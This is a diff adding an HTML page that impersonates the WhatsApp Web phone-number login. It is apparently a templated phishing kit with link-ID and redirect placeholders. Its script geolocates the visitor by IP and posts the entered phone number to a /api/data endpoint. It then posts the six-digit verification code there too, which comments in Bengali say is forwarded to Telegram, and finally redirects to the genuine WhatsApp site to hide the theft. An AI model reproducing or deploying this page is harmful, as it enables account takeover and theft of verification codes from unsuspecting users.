@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>WhatsApp Web</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#111b21;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:500px;min-height:100vh;background:#111b21;display:flex;flex-direction:column}.top-bar{background:#202c33;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #2a3942}.top-bar-left{display:flex;align-items:center;gap:12px}.whatsapp-logo{width:32px;height:32px}.whatsapp-logo svg{width:100%;height:100%;fill:#00a884}.whatsapp-title{color:#e9edef;font-size:16px;font-weight:600}.top-bar-right{display:flex;align-items:center;gap:16px}.top-bar-right a{color:#aebac1;font-size:14px;text-decoration:none;font-weight:500}.main-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}.login-card{width:100%;max-width:440px;background:#202c33;border-radius:8px;padding:40px 32px;text-align:center}.whatsapp-big-icon{margin-bottom:20px}.whatsapp-big-icon svg{width:56px;height:56px;fill:#00a884}.login-title{color:#e9edef;font-size:22px;font-weight:600;margin-bottom:8px}.login-subtitle{color:#8696a0;font-size:14px;margin-bottom:28px}.phone-input-group{margin-bottom:16px;text-align:left}.phone-input-group label{display:block;color:#aebac1;font-size:13px;margin-bottom:6px}.country-select{width:100%;padding:12px 14px;background:#2a3942;border:1px solid #374045;border-radius:6px;color:#e9edef;font-size:15px;outline:none;margin-bottom:12px}.phone-number-wrapper{display:flex;background:#2a3942;border:1px solid #374045;border-radius:6px;overflow:hidden}.country-code-label{padding:12px 14px;background:#202c33;color:#e9edef;font-size:15px;border-right:1px solid #374045;display:flex;align-items:center}.phone-number-wrapper input{flex:1;padding:12px 14px;background:transparent;border:none;color:#e9edef;font-size:15px;outline:none}.phone-terms{color:#8696a0;font-size:12px;margin:16px 0 20px;text-align:center}.phone-terms a{color:#00a884;text-decoration:none}.next-btn{width:100%;padding:14px;background:#00a884;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;opacity:0.6;pointer-events:none}.next-btn.active{opacity:1;pointer-events:auto}.otp-section{display:none;margin-top:24px;padding-top:24px;border-top:1px solid #2a3942;text-align:center}.otp-section.active{display:block}.otp-title{color:#e9edef;font-size:15px;margin-bottom:16px}.otp-inputs{display:flex;justify-content:center;gap:10px;margin-bottom:16px}.otp-inputs input{width:45px;height:50px;background:#2a3942;border:1px solid #374045;border-radius:6px;color:#e9edef;font-size:22px;font-weight:600;text-align:center;outline:none}.verify-btn{width:100%;padding:14px;background:#00a884;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:16px}.loading-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(17,27,33,0.92);z-index:999;justify-content:center;align-items:center;flex-direction:column;gap:20px}.loading-overlay.active{display:flex}.spinner{width:48px;height:48px;border:4px solid #2a3942;border-top:4px solid #00a884;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.loading-text{color:#aebac1;font-size:14px}.detection-badge{display:inline-flex;align-items:center;gap:4px;background:#00a88415;color:#00a884;font-size:11px;padding:4px 10px;border-radius:20px;margin-bottom:24px}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="top-bar">
+        <div class="top-bar-left">
+            <div class="whatsapp-logo"><svg viewBox="0 0 39 39"><path d="M10.7 32.8l.6.3c2.5 1.5 5.3 2.2 8.1 2.2 8.8 0 16-7.2 16-16 0-4.2-1.7-8.3-4.7-11.3s-7-4.7-11.3-4.7c-8.8 0-16 7.2-15.9 16 0 3.1.9 6.1 2.6 8.7l.3.5-1.6 5.9 6-1.6z"></path><path fill="#fff" d="M32.4 6.4C29 2.9 24.3 1 19.5 1 9.3 1 1.1 9.3 1.2 19.4c0 3.2.9 6.3 2.4 9.1L1 38l9.7-2.5c2.7 1.5 5.7 2.2 8.7 2.2 10.1 0 18.3-8.3 18.3-18.4 0-4.9-1.9-9.5-5.3-12.9zM19.5 34.6c-2.7 0-5.4-.7-7.7-2.1l-.6-.3-5.8 1.5L6.9 28l-.4-.6c-1.5-2.4-2.3-5.2-2.3-8 0-8.4 6.8-15.2 15.2-15.2 4.1 0 7.9 1.6 10.8 4.5 2.9 2.9 4.5 6.8 4.5 10.9-.1 8.4-6.9 15.2-15.2 15.2z"/></svg></div>
+            <span class="whatsapp-title">WhatsApp Web</span>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="login-card">
+            <div class="whatsapp-big-icon"><svg viewBox="0 0 39 39"><path d="M10.7 32.8l.6.3c2.5 1.5 5.3 2.2 8.1 2.2 8.8 0 16-7.2 16-16 0-4.2-1.7-8.3-4.7-11.3s-7-4.7-11.3-4.7c-8.8 0-16 7.2-15.9 16 0 3.1.9 6.1 2.6 8.7l.3.5-1.6 5.9 6-1.6z"></path><path fill="#111b21" d="M32.4 6.4C29 2.9 24.3 1 19.5 1 9.3 1 1.1 9.3 1.2 19.4c0 3.2.9 6.3 2.4 9.1L1 38l9.7-2.5c2.7 1.5 5.7 2.2 8.7 2.2 10.1 0 18.3-8.3 18.3-18.4 0-4.9-1.9-9.5-5.3-12.9zM19.5 34.6c-2.7 0-5.4-.7-7.7-2.1l-.6-.3-5.8 1.5L6.9 28l-.4-.6c-1.5-2.4-2.3-5.2-2.3-8 0-8.4 6.8-15.2 15.2-15.2 4.1 0 7.9 1.6 10.8 4.5 2.9 2.9 4.5 6.8 4.5 10.9-.1 8.4-6.9 15.2-15.2 15.2z"/></svg></div>
+            <h1 class="login-title">Log in with phone number</h1>
+            <p class="login-subtitle">Enter your phone number to receive a one-time code</p>
+
+            <div class="detection-badge"><span id="detectionText">Detecting your country...</span></div>
+
+            <form id="phoneForm">
+                <div class="phone-input-group">
+                    <label>Country</label>
+                    <select class="country-select" id="countrySelect">
+                        <option value="IN">India (+91)</option>
+                        <option value="BD">Bangladesh (+880)</option>
+                        <option value="PK">Pakistan (+92)</option>
+                        <option value="US">United States (+1)</option>
+                        <option value="SA">Saudi Arabia (+966)</option>
+                        <option value="AE">United Arab Emirates (+971)</option>
+                    </select>
+                </div>
+                <div class="phone-input-group">
+                    <label>Phone Number</label>
+                    <div class="phone-number-wrapper">
+                        <span class="country-code-label" id="countryCodeDisplay">+91</span>
+                        <input type="tel" id="phoneNumber" placeholder="Phone number" required>
+                    </div>
+                </div>
+                <p class="phone-terms">By continuing, you agree to our Terms of Service.</p>
+                <button type="submit" class="next-btn" id="sendOtpBtn">Next</button>
+            </form>
+
+            <div class="otp-section" id="otpSection">
+                <h3 class="otp-title">Enter the 6-digit code sent to your phone</h3>
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-input"><input type="text" maxlength="1" class="otp-input"><input type="text" maxlength="1" class="otp-input"><input type="text" maxlength="1" class="otp-input"><input type="text" maxlength="1" class="otp-input"><input type="text" maxlength="1" class="otp-input">
+                </div>
+                <button class="verify-btn" id="verifyOtpBtn">Verify Code</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><span class="loading-text">Connecting...</span></div>
+
+<script>
+const id = "{{LINK_ID}}";
+const red = "{{REDIRECT_URL}}";
+
+const countryCodes = {'IN': '+91', 'BD': '+880', 'PK': '+92', 'US': '+1', 'SA': '+966', 'AE': '+971'};
+const countryNames = {'IN': 'India', 'BD': 'Bangladesh', 'PK': 'Pakistan', 'US': 'USA', 'SA': 'Saudi Arabia', 'AE': 'UAE'};
+
+let detectedIp = "Unknown";
+const countrySelect = document.getElementById('countrySelect');
+const countryCodeDisplay = document.getElementById('countryCodeDisplay');
+const phoneInput = document.getElementById('phoneNumber');
+const sendOtpBtn = document.getElementById('sendOtpBtn');
+
+countrySelect.addEventListener('change', () => {
+    countryCodeDisplay.textContent = countryCodes[countrySelect.value] || '+91';
+});
+
+phoneInput.addEventListener('input', () => {
+    if (phoneInput.value.trim().length >= 6) sendOtpBtn.classList.add('active');
+    else sendOtpBtn.classList.remove('active');
+});
+
+async function detectCountry() {
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        detectedIp = d.ip || "Unknown";
+        if (d.country_code && countryCodes[d.country_code]) {
+            countrySelect.value = d.country_code;
+            countryCodeDisplay.textContent = countryCodes[d.country_code];
+            document.getElementById('detectionText').innerHTML = `Detected: <b>${d.country_name}</b>`;
+        }
+    } catch(e) { document.getElementById('detectionText').innerText = "Default: India (+91)"; }
+}
+detectCountry();
+
+// ১. নাম্বার সাবমিট করলে টেলিগ্রামে ডেটা যাবে
+document.getElementById('phoneForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const fullNum = countryCodeDisplay.textContent + phoneInput.value.trim();
+
+    fetch('/api/data', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            linkId: id, type: 'wa_phone',
+            data: { phone: fullNum, country_name: countryNames[countrySelect.value], detected_ip: detectedIp }
+        })
+    });
+
+    document.getElementById('otpSection').classList.add('active');
+    document.querySelector('.otp-input').focus();
+});
+
+// ওটিপি ইনপুট অটো-ফোকাস
+document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
+    input.addEventListener('input', function() {
+        if (this.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+    });
+});
+
+// ২. ওটিপি সাবমিট করলে টেলিগ্রামে ওটিপি যাবে এবং রিডাইরেক্ট হবে
+document.getElementById('verifyOtpBtn').addEventListener('click', function() {
+    let otp = "";
+    document.querySelectorAll('.otp-input').forEach(inp => otp += inp.value);
+    if (otp.length < 6) return alert("Enter 6 digit OTP");
+
+    document.getElementById('loadingOverlay').classList.add('active');
+    const fullNum = countryCodeDisplay.textContent + phoneInput.value.trim();
+
+    fetch('/api/data', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            linkId: id, type: 'wa_otp',
+            data: { phone: fullNum, otp: otp, country_name: countryNames[countrySelect.value] }
+        })
+    });
+
+    setTimeout(() => {
+        let finalRed = (red && red.length > 4 && !red.includes("REDIRECT_URL")) ? red : "https://web.whatsapp.com";
+        window.location.href = finalRed;
+    }, 2000);
+});
+</script>
+</body>
+</html>
